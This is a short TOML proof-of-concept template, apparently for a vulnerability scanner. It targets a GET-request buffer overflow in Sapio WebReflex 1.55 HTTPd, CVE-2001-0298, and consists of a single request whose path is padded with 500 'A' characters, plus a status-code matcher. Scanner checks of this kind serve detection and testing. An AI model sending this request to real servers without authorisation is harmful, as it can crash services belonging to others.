[info]
author = "ave"
description = "验证目标 Sapio WebReflex 1.55 HTTPd 是否存在 HTTP GET 请求缓冲区溢出漏洞，通过发送超长 URI 的 GET 请求检测服务是否崩溃或出现异常行为"
id = "POC-AVE-2001-0132"
name = "Sapio WebReflex 1.55 GET Denial of Service"
severity = "medium"
tags = ["ave-2001-0132"]
vuln_id = [
    "CVE-2001-0298",
    "AVE-2001-0132",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = '/{{BaseURL}}/{{repeat "A" 500}}'
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    500,
    502,
    503,
]
type = "status"
